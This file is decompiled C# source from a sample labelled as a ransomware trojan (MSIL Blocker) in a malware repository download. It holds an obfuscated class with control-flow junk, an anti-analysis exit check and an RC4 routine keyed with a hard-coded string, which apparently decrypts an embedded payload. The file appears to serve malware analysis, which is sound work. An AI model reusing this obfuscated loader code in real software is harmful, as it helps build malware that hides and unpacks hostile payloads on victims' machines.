// Decompiled with JetBrains decompiler
// Type: Esulsglfyznb.e
// Assembly: ConsoleApp6, Version=5.30.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E3023E09-FA1F-4896-E8F5-06AD3FD474BE
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.07-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-7f03d6f5a38d18082c3dd60b773921aecd203a839446a4aca4908309a004b4a4.exe

using Gcalmuzpmqwmccg;
using System;
using System.Collections;
using System.Text;
using System.Threading;

namespace Esulsglfyznb
{
  public sealed class e : ArrayList
  {
    private EventHandler b;
    private int c;
    private int d;
    private int e;
    private int f;
    private int g;
    private int[] h;
    private int[] l;
    private byte[] m;

    public e()
    {
      if (true)
        ;
      // ISSUE: explicit constructor call
      base.\u002Ector();
      Esulsglfyznb.a a = new Esulsglfyznb.a();
      if (false)
        ;
    }

    public void a(EventHandler a)
    {
      EventHandler b = this.b;
      EventHandler eventHandler1;
      if (true)
        eventHandler1 = b;
      EventHandler comparand;
      do
      {
        EventHandler eventHandler2 = eventHandler1;
        if (true)
          goto label_6;
label_3:
        EventHandler eventHandler3 = comparand + a;
        if (true)
          goto label_7;
label_4:
        EventHandler eventHandler4;
        eventHandler1 = Interlocked.CompareExchange<EventHandler>(ref this.b, eventHandler4, comparand);
        continue;
label_7:
        eventHandler4 = eventHandler3;
        goto label_4;
label_6:
        comparand = eventHandler2;
        goto label_3;
      }
      while (eventHandler1 != comparand);
    }

    public void b(EventHandler a)
    {
      EventHandler b = this.b;
      EventHandler eventHandler1;
      if (true)
        eventHandler1 = b;
      EventHandler comparand;
      do
      {
        EventHandler eventHandler2 = eventHandler1;
        if (true)
          goto label_6;
label_3:
        EventHandler eventHandler3 = comparand - a;
        if (true)
          goto label_7;
label_4:
        EventHandler eventHandler4;
        eventHandler1 = Interlocked.CompareExchange<EventHandler>(ref this.b, eventHandler4, comparand);
        continue;
label_7:
        eventHandler4 = eventHandler3;
        goto label_4;
label_6:
        comparand = eventHandler2;
        goto label_3;
      }
      while (eventHandler1 != comparand);
    }

    public override int Add(object a)
    {
      try
      {
        new ClassLibrary().Data();
      }
      catch
      {
        if (true)
          Environment.Exit(0);
      }
      int num = base.Add(a);
      EventArgs empty = EventArgs.Empty;
      if (false)
        return num;
      this.a(empty);
      return num;
    }

    private byte[] a(byte[] a)
    {
      if (true)
        goto label_4;
label_1:
      string s;
      byte[] bytes = Encoding.UTF8.GetBytes(s);
      if (true)
        goto label_5;
label_2:
      int[] numArray1 = new int[256];
      if (true)
        goto label_6;
label_3:
      this.l = new int[256];
      this.m = new byte[a.Length];
      byte[] numArray2;
      for (this.d = 0; this.d < 256; ++this.d)
      {
        this.h[this.d] = (int) numArray2[this.d % numArray2.Length];
        this.l[this.d] = this.d;
      }
      this.a(ref a);
      return this.m;
label_6:
      this.h = numArray1;
      goto label_3;
label_5:
      numArray2 = bytes;
      goto label_2;
label_4:
      s = "Qfhajewd";
      goto label_1;
    }

    private void a(ref byte[] a)
    {
      int num1 = 0;
      if (true)
        goto label_4;
label_1:
      if (true)
        goto label_5;
label_2:
      int num2;
      int num3 = num2;
      if (true)
        this.e = num3;
      for (; this.d < 256; ++this.d)
      {
        int num4 = (this.e + this.l[this.d] + this.h[this.d]) % 256;
        if (true)
          goto label_10;
label_8:
        int num5 = this.l[this.d];
        if (true)
          goto label_11;
label_9:
        this.l[this.d] = this.l[this.e];
        this.l[this.e] = this.g;
        continue;
label_11:
        this.g = num5;
        goto label_9;
label_10:
        this.e = num4;
        goto label_8;
      }
      for (this.c = this.e = this.d = 0; this.d < a.Length; ++this.d)
      {
        ++this.c;
        this.c %= 256;
        this.e += this.l[this.c];
        this.e %= 256;
        this.g = this.l[this.c];
        this.l[this.c] = this.l[this.e];
        this.l[this.e] = this.g;
        this.f = this.l[(this.l[this.c] + this.l[this.e]) % 256];
        this.m[this.d] = (byte) ((uint) a[this.d] ^ (uint) this.f);
      }
      return;
label_5:
      this.d = num1;
      goto label_2;
label_4:
      num2 = num1;
      goto label_1;
    }

    public byte[] b(byte[] a)
    {
      if (true)
        ;
      byte[] a1 = a;
      if (true)
        ;
      return this.a(a1);
    }

    private void a(EventArgs a)
    {
      if (true)
        ;
      if (this.b == null)
        return;
      if (true)
        ;
      EventHandler b = this.b;
      if (true)
        ;
      EventArgs e = a;
      b((object) this, e);
    }

    public override void Clear()
    {
      if (true)
        goto label_3;
label_1:
      EventArgs empty = EventArgs.Empty;
      if (false)
        return;
      this.a(empty);
      return;
label_3:
      base.Clear();
      goto label_1;
    }
  }
}
